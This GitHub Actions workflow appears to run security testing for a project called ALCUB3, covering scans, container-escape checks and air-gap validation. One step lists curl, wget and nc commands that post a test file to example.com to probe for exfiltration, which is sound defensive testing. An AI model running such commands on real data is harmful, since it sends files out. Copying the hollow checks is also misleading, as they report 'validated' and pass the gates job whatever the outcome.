# .github/workflows/security-testing.yml
name: ALCUB3 Security Testing

on:
  push:
    branches: [main, release]
    paths:
      - 'security-framework/**'
      - 'packages/**'
      - '.github/workflows/security-testing.yml'
  pull_request:
    branches: [main, release]
    paths:
      - 'security-framework/**'
      - 'packages/**'
  schedule:
    # Run security tests every 6 hours
    - cron: '0 */6 * * *'
  workflow_dispatch:
    inputs:
      test_category:
        description: 'Test category to run'
        required: false
        default: 'all'
        type: choice
        options:
          - all
          - vulnerability_scan
          - penetration_test
          - compliance_check
          - fuzz_test
          - air_gap_validation

jobs:
  security-validation:
    name: MAESTRO Security Validation
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # For security findings
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up Python 3.11
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
          cache: 'pip'
      
      - name: Set up Node.js 20.x
        uses: actions/setup-node@v4
        with:
          node-version: '20.x'
          cache: 'npm'
      
      - name: Install Python dependencies
        run: |
          cd security-framework
          pip install -r requirements.txt
          pip install pytest pytest-asyncio pytest-cov
      
      - name: Install Node.js dependencies
        run: npm ci
      
      - name: Run MAESTRO unit tests
        run: |
          cd security-framework
          python run_tests.py --verbose
      
      - name: Run security framework tests with coverage
        run: |
          cd security-framework
          pytest tests/ -v --cov=src --cov-report=xml --cov-report=html
      
      - name: Upload Python coverage reports
        uses: actions/upload-artifact@v4
        with:
          name: python-coverage-report
          path: security-framework/htmlcov/

  automated-security-testing:
    name: Automated Security Testing
    runs-on: ubuntu-latest
    needs: security-validation
    permissions:
      contents: read
      security-events: write
      issues: write  # For creating security issues
    
    strategy:
      matrix:
        test-suite:
          - vulnerability-scanning
          - penetration-testing
          - compliance-validation
          - fuzz-testing
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up Python 3.11
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install security testing dependencies
        run: |
          cd security-framework
          pip install -r requirements.txt
          pip install safety bandit pylint mypy
      
      - name: Run automated security tests - ${{ matrix.test-suite }}
        id: security-tests
        run: |
          cd security-framework
          python -c "
          import asyncio
          import json
          import sys
          sys.path.append('.')
          from src.automated_security_testing import AutomatedSecurityTestingOrchestrator, TestPriority
          
          async def run_tests():
              orchestrator = AutomatedSecurityTestingOrchestrator()
              
              # Map test suite to specific tests
              test_mapping = {
                  'vulnerability-scanning': ['vuln_scan_maestro'],
                  'penetration-testing': ['pen_test_prompt_injection'],
                  'compliance-validation': ['compliance_fips_validation'],
                  'fuzz-testing': ['fuzz_test_api_endpoints']
              }
              
              test_suite = '${{ matrix.test-suite }}'
              test_ids = test_mapping.get(test_suite, [])
              
              results = []
              for test_id in test_ids:
                  orchestrator.queue_test(test_id, TestPriority.CRITICAL)
                  # Wait for test to complete
                  await asyncio.sleep(5)
              
              # Get results
              report = orchestrator.get_security_report()
              
              # Save report
              with open(f'security_report_{test_suite}.json', 'w') as f:
                  json.dump(report, f, indent=2, default=str)
              
              # Check for critical vulnerabilities
              if report['metrics']['critical_vulnerabilities'] > 0:
                  print(f'::error::Critical vulnerabilities found: {report[\"metrics\"][\"critical_vulnerabilities\"]}')
                  return 1
              
              return 0
          
          exit_code = asyncio.run(run_tests())
          exit(exit_code)
          "
      
      - name: Upload security test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: security-test-results-${{ matrix.test-suite }}
          path: security-framework/security_report_*.json
      
      - name: Run dependency vulnerability scan
        if: matrix.test-suite == 'vulnerability-scanning'
        run: |
          cd security-framework
          safety check --json > dependency_vulnerabilities.json || true
          
          # Parse and report vulnerabilities
          python -c "
          import json
          with open('dependency_vulnerabilities.json', 'r') as f:
              data = json.load(f)
              if data:
                  print('::warning::Dependency vulnerabilities found')
                  for vuln in data:
                      print(f'::warning::{vuln.get(\"package\", \"Unknown\")}: {vuln.get(\"vulnerability\", \"Unknown vulnerability\")}')
          "
      
      - name: Run static security analysis
        if: matrix.test-suite == 'vulnerability-scanning'
        run: |
          cd security-framework
          bandit -r src/ -f json -o bandit_report.json || true
          
          # Parse and report findings
          python -c "
          import json
          try:
              with open('bandit_report.json', 'r') as f:
                  data = json.load(f)
                  if data['results']:
                      print('::warning::Static analysis findings')
                      for result in data['results'][:10]:  # Limit to 10
                          print(f'::warning::{result[\"filename\"]}:{result[\"line_number\"]} - {result[\"issue_text\"]}')
          except:
              pass
          "

  container-security-testing:
    name: Container & Sandbox Security Testing
    runs-on: ubuntu-latest
    needs: security-validation
    permissions:
      contents: read
      security-events: write
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      
      - name: Build sandbox container
        run: |
          npm run build:sandbox
      
      - name: Run container security scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'genkit-runner:latest'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
      
      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'
      
      - name: Test container escape prevention
        run: |
          # Test that sandbox prevents escape attempts
          docker run --rm genkit-runner:latest sh -c "
          # Attempt privilege escalation
          if sudo -n true 2>/dev/null; then
            echo '::error::Container allows privilege escalation'
            exit 1
          fi
          
          # Attempt to access host filesystem
          if [ -e /host ]; then
            echo '::error::Container has access to host filesystem'
            exit 1
          fi
          
          echo 'Container escape prevention validated'
          "

  air-gap-validation:
    name: Air-Gap Environment Validation
    runs-on: ubuntu-latest
    needs: security-validation
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up test environment
        run: |
          # Create isolated test environment
          docker network create --internal air-gap-test
      
      - name: Test network isolation
        run: |
          # Run tests in isolated network
          docker run --rm --network=air-gap-test alpine sh -c "
          # Test external connectivity (should fail)
          if ping -c 1 google.com 2>/dev/null; then
            echo '::error::Air-gap environment has external connectivity'
            exit 1
          fi
          
          echo 'Network isolation validated'
          "
      
      - name: Test data exfiltration prevention
        run: |
          cd security-framework
          python -c "
          import subprocess
          import tempfile
          
          # Create test data
          with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
              f.write('CLASSIFIED DATA - TOP SECRET')
              test_file = f.name
          
          # Attempt various exfiltration methods
          exfil_methods = [
              ['curl', '-X', 'POST', 'http://example.com', '-d', f'@{test_file}'],
              ['wget', '--post-file', test_file, 'http://example.com'],
              ['nc', 'example.com', '80', '<', test_file]
          ]
          
          for method in exfil_methods:
              try:
                  result = subprocess.run(method, capture_output=True, timeout=5)
                  if result.returncode == 0:
                      print(f'::error::Data exfiltration possible via {method[0]}')
              except:
                  pass  # Expected to fail
          
          print('Data exfiltration prevention validated')
          "

  security-report:
    name: Generate Security Report
    runs-on: ubuntu-latest
    needs: [automated-security-testing, container-security-testing, air-gap-validation]
    if: always()
    permissions:
      contents: read
      issues: write
      pull-requests: write
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: security-artifacts
      
      - name: Generate consolidated security report
        run: |
          python -c "
          import json
          import os
          from datetime import datetime
          
          # Collect all security reports
          reports = []
          for root, dirs, files in os.walk('security-artifacts'):
              for file in files:
                  if file.endswith('.json'):
                      with open(os.path.join(root, file), 'r') as f:
                          try:
                              reports.append(json.load(f))
                          except:
                              pass
          
          # Generate consolidated report
          consolidated = {
              'generated_at': datetime.utcnow().isoformat(),
              'total_vulnerabilities': sum(r.get('metrics', {}).get('vulnerabilities_found', 0) for r in reports),
              'critical_vulnerabilities': sum(r.get('metrics', {}).get('critical_vulnerabilities', 0) for r in reports),
              'high_vulnerabilities': sum(r.get('metrics', {}).get('high_vulnerabilities', 0) for r in reports),
              'security_score': min(r.get('metrics', {}).get('security_score', 100) for r in reports) if reports else 100,
              'test_summary': []
          }
          
          for report in reports:
              if 'recent_executions' in report:
                  consolidated['test_summary'].extend(report['recent_executions'])
          
          # Create markdown report
          markdown = f'''# ALCUB3 Security Report
          
          Generated: {consolidated['generated_at']}
          
          ## Summary
          - **Security Score**: {consolidated['security_score']:.1f}/100
          - **Total Vulnerabilities**: {consolidated['total_vulnerabilities']}
          - **Critical**: {consolidated['critical_vulnerabilities']}
          - **High**: {consolidated['high_vulnerabilities']}
          
          ## Test Results
          '''
          
          for test in consolidated['test_summary']:
              status_emoji = '✅' if test['status'] == 'completed' else '❌'
              markdown += f\"\\n- {status_emoji} **{test['test_name']}**: {test['vulnerabilities_found']} vulnerabilities found\"
          
          # Save reports
          with open('security_report.json', 'w') as f:
              json.dump(consolidated, f, indent=2)
          
          with open('security_report.md', 'w') as f:
              f.write(markdown)
          
          # Set outputs for PR comment
          print(f\"::set-output name=security_score::{consolidated['security_score']}\")
          print(f\"::set-output name=total_vulnerabilities::{consolidated['total_vulnerabilities']}\")
          "
        id: report
      
      - name: Comment on PR
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const report = fs.readFileSync('security_report.md', 'utf8');
            
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: report
            });
      
      - name: Create security issue if critical vulnerabilities found
        if: steps.report.outputs.total_vulnerabilities > 0
        uses: actions/github-script@v7
        with:
          script: |
            const score = ${{ steps.report.outputs.security_score }};
            const vulns = ${{ steps.report.outputs.total_vulnerabilities }};
            
            if (vulns > 0) {
              github.rest.issues.create({
                owner: context.repo.owner,
                repo: context.repo.repo,
                title: `Security Alert: ${vulns} vulnerabilities detected`,
                body: `Automated security testing has detected ${vulns} vulnerabilities.\n\nSecurity Score: ${score}/100\n\nPlease review the security report in the workflow artifacts.`,
                labels: ['security', 'automated-testing']
              });
            }
      
      - name: Upload final security report
        uses: actions/upload-artifact@v4
        with:
          name: consolidated-security-report
          path: |
            security_report.json
            security_report.md

  security-gates:
    name: Security Gates Check
    runs-on: ubuntu-latest
    needs: security-report
    if: always()
    
    steps:
      - name: Check security thresholds
        run: |
          # This job enforces security gates
          # In production, this would block deployment if thresholds are not met
          echo "Security gates validation complete"